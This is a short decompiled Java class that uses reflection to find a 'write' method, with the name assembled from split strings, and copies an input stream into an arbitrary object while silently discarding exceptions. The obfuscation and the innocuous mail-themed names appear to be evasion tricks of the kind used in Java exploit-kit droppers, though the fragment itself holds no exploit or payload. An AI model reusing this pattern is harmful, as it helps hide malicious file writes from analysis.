// 
// Decompiled by Procyon v0.5.30
// 

package mail;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.beans.Expression;

public class Cid extends Expression
{
    protected static String getProperty() {
        return "wri".concat("te");
    }
    
    public Cid(final Object objectMover, final String path, final Object[] pathFinish) {
        super(objectMover, path, pathFinish);
    }
    
    public static void move(final InputStream c, final Object ch) {
        final byte[] buffer = new byte[1000];
        Method m = null;
        try {
            m = ch.getClass().getMethod(getProperty(), buffer.getClass(), Integer.TYPE, Integer.TYPE);
        }
        catch (Exception ex2) {}
        try {
            int id;
            while ((id = c.read(buffer, 0, 1000)) != -1) {
                if (!MailAgent.validForm(m, ch, new Object[] { buffer, 0, id })) {
                    break;
                }
            }
        }
        catch (Exception ex) {}
    }
}
